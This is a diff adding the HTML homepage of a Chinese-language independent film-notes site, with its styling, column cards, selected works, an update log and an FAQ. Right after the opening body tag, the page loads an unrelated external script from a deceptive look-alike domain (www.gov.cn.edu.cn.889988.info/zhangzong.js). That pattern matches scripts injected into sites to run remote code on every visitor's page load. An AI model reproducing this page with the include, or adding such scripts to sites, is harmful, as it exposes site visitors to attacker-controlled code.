@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>潦草影视 — 手写质感的独立影像笔记 | liaocaoyingshi-zh.github.io</title>
+<meta name="description" content="潦草影视（liaocaoyingshi-zh.github.io）是一份用手写速度记录影像的独立笔记：短片、纪录片与冷门佳作的选片、拉片与观看心得，不定期更新，只写值得停下来看的那部分。">
+<meta name="keywords" content="潦草影视,liaocaoyingshi-zh,liaocaoyingshi-zh.github.io,独立影像,短片推荐,纪录片笔记,拉片,冷门电影,观影随笔">
+<meta name="author" content="潦草影视">
+<meta name="theme-color" content="#0f1419">
+<link rel="canonical" href="https://liaocaoyingshi-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#151a1e;--paper:#f4f1ea;--paper2:#ebe6da;--accent:#d9482b;--accent2:#1f6f5c;
+  --line:rgba(21,26,30,.14);--muted:#6b7280;--card:#fffdf9;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:999;
+  background-image:radial-gradient(rgba(21,26,30,.035) 1px,transparent 1px);
+  background-size:5px 5px;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1240px;margin:0 auto;padding:0 22px}
+
+/* ---------- header ---------- */
+header{position:sticky;top:0;z-index:50;background:rgba(244,241,234,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.hbox{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:800;letter-spacing:.5px}
+.logo b{font-size:21px}
+.logo em{font-style:normal;font-size:11px;color:var(--accent);border:1px solid var(--accent);border-radius:20px;padding:1px 8px}
+nav{display:flex;gap:6px}
+nav a{font-size:14px;padding:7px 13px;border-radius:8px;color:#3a424a;transition:.2s}
+nav a:hover{background:var(--ink);color:#fff}
+.hbtn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:9px;background:var(--card);cursor:pointer;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.hbtn i{width:17px;height:1.5px;background:var(--ink);display:block;transition:.25s}
+.hbtn.on i:nth-child(1){transform:translateY(5.5px) rotate(45deg)}
+.hbtn.on i:nth-child(2){opacity:0}
+.hbtn.on i:nth-child(3){transform:translateY(-5.5px) rotate(-45deg)}
+
+/* ---------- hero ---------- */
+.hero{padding:76px 0 60px;border-bottom:1px dashed var(--line);position:relative}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2px;color:var(--accent);margin-bottom:22px}
+.eyebrow::before{content:"";width:26px;height:1px;background:var(--accent)}
+h1{font-size:clamp(34px,7.4vw,72px);line-height:1.08;letter-spacing:-1.5px;font-weight:850}
+h1 span{color:var(--accent)}
+.lede{margin-top:24px;max-width:640px;font-size:clamp(15px,2.6vw,18px);color:#4a5158}
+.hero-actions{margin-top:34px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 22px;border-radius:10px;font-size:14px;font-weight:700;border:1px solid var(--ink);transition:.2s}
+.btn.primary{background:var(--ink);color:#fff}
+.btn.primary:hover{background:var(--accent);border-color:var(--accent);transform:translateY(-2px)}
+.btn.ghost{background:transparent}
+.btn.ghost:hover{background:var(--card);transform:translateY(-2px)}
+.hero-meta{margin-top:44px;display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--line);padding-top:18px;gap:14px}
+.hero-meta div span{display:block;font-size:11px;color:var(--muted);letter-spacing:1px}
+.hero-meta div b{font-size:17px;font-weight:800;word-break:break-all}
+.hero-note{position:absolute;right:22px;top:90px;width:150px;font-size:12px;color:var(--muted);line-height:1.6;display:none}
+.hero-note::before{content:"✎";color:var(--accent);margin-right:5px}
+
+/* ---------- section ---------- */
+section{padding:78px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:38px}
+.sec-head h2{font-size:clamp(24px,4.4vw,38px);font-weight:820;letter-spacing:-.6px;line-height:1.2}
+.sec-head h2 small{display:block;font-size:12px;font-weight:500;color:var(--accent);letter-spacing:3px;margin-bottom:9px}
+.sec-desc{max-width:420px;font-size:14px;color:#56606a}
+
+/* ---------- 栏目：横向滑动 ---------- */
+.hscroll{display:flex;gap:18px;overflow-x:auto;padding:6px 2px 26px;scroll-snap-type:x mandatory;scrollbar-width:thin}
+.hscroll::-webkit-scrollbar{height:5px}
+.hscroll::-webkit-scrollbar-thumb{background:rgba(21,26,30,.18);border-radius:4px}
+.chan{flex:0 0 310px;scroll-snap-align:start;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:26px 24px;position:relative;transition:.28s}
+.chan:hover{transform:translateY(-6px);border-color:var(--accent);box-shadow:0 14px 30px -18px rgba(21,26,30,.45)}
+.chan .no{font-size:12px;font-weight:800;color:var(--accent);letter-spacing:2px}
+.chan h3{font-size:20px;margin:10px 0 12px}
+.chan p{font-size:13.5px;color:#56606a}
+.chan .go{display:inline-flex;align-items:center;gap:6px;margin-top:18px;font-size:13px;font-weight:700;color:var(--ink)}
+.chan:hover .go{color:var(--accent)}
+.chan .tag{position:absolute;right:18px;top:20px;font-size:10px;padding:3px 8px;border-radius:20px;background:var(--paper2);color:#4a5158}
+
+/* ---------- 作品： masonry 磁贴 ---------- */
+.tiles{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:118px;gap:14px}
+.tile{grid-column:span 1;grid-row:span 1;border-radius:14px;padding:18px;display:flex;flex-direction:column;justify-content:space-between;background:var(--card);border:1px solid var(--line);transition:.28s;position:relative;overflow:hidden}
+.tile::after{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--accent);transform:scaleY(0);transition:.3s;transform-origin:bottom}
+.tile:hover{transform:translateY(-4px);box-shadow:0 12px 26px -18px rgba(21,26,30,.5)}
+.tile:hover::after{transform:scaleY(1)}
+.tile.l{grid-column:span 2;grid-row:span 2;background:var(--ink);color:#f4f1ea;border-color:var(--ink)}
+.tile.l::after{background:var(--accent)}
+.tile.w2{grid-column:span 2}
+.tile.h2{grid-row:span 2}
+.tile h4{font-size:15px;line-height:1.35}
+.tile.l h4{font-size:26px;line-height:1.25;letter-spacing:-.4px}
+.tile .yr{font-size:11px;letter-spacing:1.5px;color:var(--muted)}
+.tile.l .yr{color:#c9cfd6}
+.tile .kind{font-size:10.5px;padding:3px 9px;border-radius:20px;background:var(--paper2);align-self:flex-start}
+.tile.l .kind{background:rgba(255,255,255,.12);color:#f4f1ea}
+
+/* ---------- 日志：时间轴 ---------- */
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:5px;top:8px;bottom:8px;width:1px;background:var(--line)}
+.entry{position:relative;padding:0 0 30px 20px}
+.entry:last-child{padding-bottom:0}
+.entry::before{content:"";position:absolute;left:-26px;top:7px;width:11px;height:11px;border-radius:50%;background:var(--paper);border:2px solid var(--accent)}
+.entry.on::before{background:var(--accent)}
+.entry .d{font-size:12px;font-weight:800;color:var(--accent);letter-spacing:1px}
+.entry h4{font-size:16.5px;margin:5px 0 7px}
+.entry p{font-size:13.5px;color:#56606a}
+.entry a{display:inline-block;margin-top:8px;font-size:12.5px;font-weight:700;border-bottom:1px solid var(--ink);padding-bottom:1px}
+.aside-box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px}
+.aside-box h4{font-size:16px;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.aside-box h4::before{content:"";width:14px;height:14px;background:var(--accent);border-radius:3px}
+.f-list li{list-style:none;padding:11px 0;border-bottom:1px dashed var(--line);font-size:13.5px;display:flex;justify-content:space-between;gap:10px}
+.f-list li:last-child{border-bottom:0}
+.f-list i{font-style:normal;font-size:11px;color:var(--muted);white-space:nowrap}
+
+/* ---------- 关于 ---------- */
+.split{display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:start}
+.bio{font-size:15.5px;color:#3f474e}
+.bio p{margin-bottom:16px}
+.bio p:first-child::first-letter{font-size:44px;font-weight:850;color:var(--accent);float:left;line-height:1;margin:4px 9px 0 0}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:14px;overflow:hidden;margin-top:28px}
+.stats div{background:var(--card);padding:18px 12px;text-align:center}
+.stats b{display:block;font-size:24px;font-weight:850}
+.stats span{font-size:11px;color:var(--muted);letter-spacing:1px}
+.faq{border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.faq div{padding:16px 20px;border-bottom:1px solid var(--line);background:var(--card)}
+.faq div:last-child{border-bottom:0}
+.faq b{font-size:14.5px;display:block;margin-bottom:5px}
+.faq p{font-size:13px;color:#56606a}
+
+/* ---------- 页脚 ---------- */
+footer{border-top:1px solid var(--line);padding:52px 0 30px;background:var(--ink);color:#cfd6de}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:36px}
+.foot-grid h5{font-size:12px;letter-spacing:2px;color:var(--accent);margin-bottom:14px}
+.foot-grid p,.foot-grid li{font-size:13px;color:#a8b0b8;line-height:1.9;list-style:none}
+.foot-grid a:hover{color:#fff}
+.copy{border-top:1px solid rgba(255,255,255,.12);padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:12px;color:#8b939b}
+.copylink{color:#cfd6de;font-weight:700}
+
+/* ---------- 响应式 ---------- */
+@media(min-width:1080px){
+  .hero-note{display:block}
+}
+@media(max-width:900px){
+  .tiles{grid-template-columns:repeat(2,1fr);grid-auto-rows:104px}
+  .split{grid-template-columns:1fr;gap:30px}
+  .hero-meta{grid-template-columns:repeat(2,1fr);row-gap:18px}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:720px){
+  .hbtn{display:flex}
+  nav{position:fixed;inset:62px 0 0 0;background:var(--paper);flex-direction:column;padding:18px;gap:4px;transform:translateX(100%);transition:.3s;border-top:1px solid var(--line);overflow-y:auto}
+  nav.on{transform:translateX(0)}
+  nav a{font-size:16px;padding:14px 16px;border-radius:10px}
+  section{padding:58px 0}
+  .tiles{grid-auto-rows:96px;gap:10px}
+  .tile,.tile.w2,.tile.l{grid-column:span 2}
+  .tile.h2{grid-row:span 1}
+  .foot-grid{grid-template-columns:1fr}
+}
+@media(max-width:460px){
+  .wrap{padding:0 16px}
+  .hero{padding:50px 0 44px}
+  .tiles{grid-template-columns:1fr;grid-auto-rows:auto;gap:10px}
+  .tile{grid-column:span 1;grid-row:span 1;min-height:104px}
+  .tile.l h4{font-size:20px}
+  .chan{flex:0 0 265px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap hbox">
+    <a class="logo" href="#home"><b>潦草影视</b><em>liaocaoyingshi-zh</em></a>
+    <button class="hbtn" id="menuBtn" aria-label="菜单"><i/><i/><i/></button>
+    <nav id="nav">
+      <a href="#home">首页</a>
+      <a href="#channel">栏目</a>
+      <a href="#works">选片</a>
+      <a href="#news">日志</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<section id="home" class="hero">
+  <div class="wrap">
+    <div class="eyebrow">INDEPENDENT SCREEN NOTES</div>
+    <h1>潦草影视<br>用<span>手写的速度</span>记录影像</h1>
+    <p class="lede">潦草影视（liaocaoyingshi-zh.github.io）不做资讯搬运，只写看过之后还想再看一遍的那部分：选片理由、镜头拆解、导演脉络，以及几段没被讲完的幕后。</p>
+    <div class="hero-actions">
+      <a class="btn primary" href="#works">去看选片 →</a>
+      <a class="btn ghost" href="#channel">了解栏目</a>
+    </div>
+    <div class="hero-meta">
+      <div><span>站点名称</span><b>潦草影视</b></div>
+      <div><span>访问地址</span><b>liaocaoyingshi-zh.github.io</b></div>
+      <div><span>更新频率</span><b>每周 1–2 篇</b></div>
+      <div><span>内容方向</span><b>独立 / 纪录片</b></div>
+    </div>
+  </div>
+  <div class="hero-note">字迹潦草，<br>但每一帧都认真看过。</div>
+</section>
+
+<section id="channel">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>01 / CHANNELS</small>五个栏目，各写各的事</h2>
+      <p class="sec-desc">横向滑动查看。每个栏目独立成篇，不互相串味，也不追热点。</p>
+    </div>
+    <div class="hscroll">
+      <article class="chan"><span class="no">CH.01</span><span class="tag">每周</span><h3>片单速写</h3><p>一份不超过十部的短名单，只写为什么值得现在看，不写剧情简介。</p><span class="go">进入栏目 →</span></article>
+      <article class="chan"><span class="no">CH.02</span><span class="tag">拉片</span><h3>镜头拆解</h3><p>按时间轴逐场分析：机位、剪辑点、声音设计，以及导演在哪一处留了手。</p><span class="go">进入栏目 →</span></article>
+      <article class="chan"><span class="no">CH.03</span><span class="tag">访谈</span><h3>创作者对话</h3><p>与独立导演、摄影和剪辑的短访谈，问题具体，回答不给标准答案。</p><span class="go">进入栏目 →</span></article>
+      <article class="chan"><span class="no">CH.04</span><span class="tag">档案</span><h3>冷门档案</h3><p>被片单遗漏的八九十年代作品，补齐脉络，也补几张找不到的剧照。</p><span class="go">进入栏目 →</span></article>
+      <article class="chan"><span class="no">CH.05</span><span class="tag">随记</span><h3>观影随记</h3><p>不分类的零散感受：影院里的光、字幕的错译、散场后的十分钟。</p><span class="go">进入栏目 →</span></article>
+    </div>
+  </div>
+</section>
+
+<section id="works">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>02 / SELECTED WORKS</small>近期写过的片子</h2>
+      <p class="sec-desc">大小不一的磁贴，大的那块是本期主写。点击可展开详情页（演示用锚点）。</p>
+    </div>
+    <div class="tiles">
+      <article class="tile l"><span class="yr">2024 · 纪录片</span><span class="kind">本期主写</span><h4>《寂静的河》：把镜头交给等待</h4></article>
+      <article class="tile w2"><span class="yr">2023 · 短片</span><h4>《第七个夜晚》与它的三处留白</h4></article>
+      <article class="tile"><span class="yr">2022</span><h4>一部被片名耽误的冷门片</h4></article>
+      <article class="tile h2"><span class="yr">2021 · 长片</span><h4>重看《路边野餐》：时间不是线性的</h4></article>
+      <article class="tile"><span class="yr">2024</span><h4>今年最被低估的摄影</h4></article>
+      <article class="tile w2"><span class="yr">2020 · 独立</span><h4>低成本怎么拍出空间感</h4></article>
+      <article class="tile"><span class="yr">2019</span><h4>从剧本到成片的删减</h4></article>
+      <article class="tile"><span class="yr">2024 · 动画</span><h4>三分钟的孤独感</h4></article>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap" style="display:grid;grid-template-columns:1.55fr 1fr;gap:44px">
+    <div>
+      <div class="sec-head" style="margin-bottom:26px"><h2><small>03 / LOG</small>更新日志</h2></div>
+      <div class="tl">
+        <div class="entry on"><div class="d">2026 · 10 · 18</div><h4>潦草影视 站点内容结构说明</h4><p>把五个栏目的边界重新划了一遍：片单速写只做推荐，拉片只做拆解，不再混着写。</p><a href="#">阅读全文 →</a></div>
+        <div class="entry"><div class="d">2026 · 10 · 09</div><h4>《寂静的河》拉片笔记（上）：前二十分钟</h4><p>开场长镜头的七次呼吸，以及声音如何在没有对白时接管叙事。</p><a href="#">阅读全文 →</a></div>
+        <div class="entry"><div class="d">2026 · 09 · 26</div><h4>一份不按年份排的秋天片单</h4><p>十部适合在变凉的晚上看的作品，选片标准是「看完会想给谁发条消息」。</p><a href="#">阅读全文 →</a></div>
+        <div class="entry"><div class="d">2026 · 09 · 14</div><h4>对话剪辑师林晚：删掉的那场戏</h4><p>关于取舍的访谈，她提到一个判断标准——「观众会不会记得」。</p><a href="#">阅读全文 →</a></div>
+        <div class="entry"><div class="d">2026 · 08 · 30</div><h4>冷门档案：1998 年的那部电视电影</h4><p>只在资料馆放过两场的作品，我们找到了它的分镜稿。</p><a href="#">阅读全文 →</a></div>
+      </div>
+    </div>
+    <aside class="aside-box">
+      <h4>常读的几篇</h4>
+      <ul class="f-list">
+        <li>怎样在一部片子里找到主线 <i>08.21</i></li>
+        <li>别急着看解说，先看完正片 <i>08.05</i></li>
+        <li>关于「潦草」这个站名的由来 <i>07.19</i></li>
+        <li>片尾字幕也是电影的一部分 <i>07.02</i></li>
+        <li>我们为什么不写影评打分 <i>06.14</i></li>
+      </ul>
+    </aside>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head"><h2><small>04 / ABOUT</small>关于潦草影视</h2></div>
+    <div class="split">
+      <div>
+        <div class="bio">
+          <p>潦草影视（liaocaoyingshi-zh.github.io）由几个在不同城市看片的人维持，更新不勤，但每篇都看过至少两遍。</p>
+          <p>我们关心的是影像怎么被做出来，以及它为什么在某个瞬间击中人。这里没有资讯快讯，没有资源汇总，只有笔记。</p>
+          <p>如果你想找的是「这部片讲什么」，这里可能不太合适；如果你想知道「它怎么做到的」，欢迎常来。</p>
+        </div>
+        <div class="stats">
+          <div><b>200+</b><span>篇笔记</span></div>
+          <div><b>5</b><span>个栏目</span></div>
+          <div><b>2018</b><span>开始写</span></div>
+        </div>
+      </div>
+      <div class="faq">
+        <div><b>为什么叫「潦草」？</b><p>笔记本来就不该工整。写得太漂亮，容易忘了看片时的第一反应。</p></div>
+        <div><b>内容多久更新一次？</b><p>每周一到两篇，长文间隔会久一些，不追档期。</p></div>
+        <div><b>可以投稿或合作吗？</b><p>可以，站点内各栏目页底部都有联系入口，只收认真写过的东西。</p></div>
+        <div><b>在哪里能稳定访问？</b><p>主站地址是 <a class="copylink" href="https://liaocaoyingshi-zh.github.io">liaocaoyingshi-zh.github.io</a>，GitHub Pages 托管。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a class="logo" href="#home" style="color:#fff"><b>潦草影视</b><em>liaocaoyingshi-zh</em></a>
+        <p style="margin-top:14px">字迹潦草，但每一帧都认真看过。潦草影视，独立影像笔记。</p>
+      </div>
+      <div><h5>栏目</h5><ul><li><a href="#channel">片单速写</a></li><li><a href="#channel">镜头拆解</a></li><li><a href="#channel">创作者对话</a></li></ul></div>
+      <div><h5>内容</h5><ul><li><a href="#works">选片</a></li><li><a href="#news">更新日志</a></li><li><a href="#about">关于本站</a></li></ul></div>
+      <div><h5>访问</h5><ul><li><a href="https://liaocaoyingshi-zh.github.io">liaocaoyingshi-zh.github.io</a></li><li><a href="#home">返回顶部</a></li></ul></div>
+    </div>
+    <div class="copy"><span>© 潦草影视 · 本站由 GitHub Pages 托管</span><span>https://liaocaoyingshi-zh.github.io</span></div>
+  </div>
+</footer>
+
+<script>
+var btn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+btn.addEventListener('click',function(){btn.classList.toggle('on');nav.classList.toggle('on');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A'){btn.classList.remove('on');nav.classList.remove('on');}});
+</script>
+</body>
+</html>
